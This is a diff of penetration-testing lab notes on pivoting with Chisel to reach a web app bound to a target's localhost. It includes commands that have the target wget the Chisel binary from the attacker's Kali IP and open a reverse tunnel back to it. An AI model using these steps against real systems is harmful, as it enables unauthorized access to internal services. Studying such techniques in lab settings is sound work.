@@ -1,43 +1,40 @@
-Scenario - There is a webapp running on localhost on the target and you need to access from your local machine
+Scenario - Webapp running on target localhost and you need to access from your local machine
 Solution - Chisel
 
-Chisel is a fast TCP/UDP tunnel over HTTP, secured with SSH-like encryption. It’s useful for more complex scenarios 
-or when SSH port forwarding isn’t sufficient (e.g., if you need to share access or bypass restrictions). Below is 
-the process to set up Chisel for your use case.
-
-####Install Chisel on  your Kali machine (192.168.45.184) and copy to the server (192.168.238.103).
-  kali>
-sudo apt update
-sudo apt install chisel
-python3 -m http.server 8000
-  kali/>
-  server>
-wget http://192.168.45.184:8000/chisel -O /tmp/chisel
-chmod +x /tmp/chisel
-/tmp/chisel --version
-  server/>
-#####Start the Chisel Server on the Linux Machine listening on port 9000(change if needed):
-  server>
-/tmp/chisel server --port 9000
-  server/>
-#####On Kali, run the Chisel client to connect to the server and forward the webapp port. 
-#####192.168.238.103:9000: Chisel server’s IP and port. 
-#####80:localhost:8080: Maps port 80 on the server to port 8080 on Kali.
-  kali>
-chisel client 192.168.238.103:9000 80:localhost:8080
-  kali/>
-#####Access the Webapp
-Open a browser on your Kali machine. Navigate to http://localhost:8080.
-Stop the Chisel client on Kali with Ctrl+C.
-Stop the Chisel server on the server: pkill chisel
-
-#Alternative commands to transfer chisel
-From Kali
+#First ####Move Chisel from Kali machine (192.168.45.184) to target (192.168.238.103).
+wget http://192.168.45.184:8000/chisel -O /tmp/chisel 
 scp /tmp/chisel victimuser@192.168.238.103:/tmp/chisel
 
+~~~~~~Method 1 - Local Port Forwarding~~~~~~~
+server: /tmp/chisel server --port 9000
+kali: chisel client 192.168.238.103:9000 80:localhost:8080
+kali: Open a browser on your Kali machine. Navigate to http://localhost:8080.
 
+Explanation - Local Port Forwarding 
+# Start chisel listening on port 9000 on server:
+# Kali Machine, connect to the server and forward the webapp port. 
+# 192.168.238.103:9000: Chisel server’s IP and port. 
+# 80:localhost:8080: Maps port 80 on the server to port 8080 on Kali.
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~ Method 2 - Reverse Port Forwarding ~~~~~~~
+kali: chisel server --port 9000 --reverse
+server: chisel client 192.168.45.184:9000 R:8080:127.0.0.1:80
+kali: Open a browser on your Kali machine. Navigate to http://localhost:8080.
 
+#Explanation of Reverse Port Forwarding
+# The kali machine runs the Chisel server on port 9000 with the --reverse flag to allow reverse tunnel connections.
+# The server machine runs the Chisel client and connects to the kali machine’s Chisel server at 192.168.45.184:9000.
+# The R flag specifies reverse port forwarding.
+# 8080 is the port on the kali machine that will be exposed to access the server’s service.
+# 127.0.0.1:80 refers to the service running on the server’s localhost on port 80 (e.g., a web server).
+# This setup creates a reverse tunnel where port 8080 on the kali machine is forwarded to port 80 on the server machine.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+#To Kill Chisel
+Stop the Chisel client on Kali with Ctrl+C.
+Stop the Chisel server on the server: pkill chisel
 
 
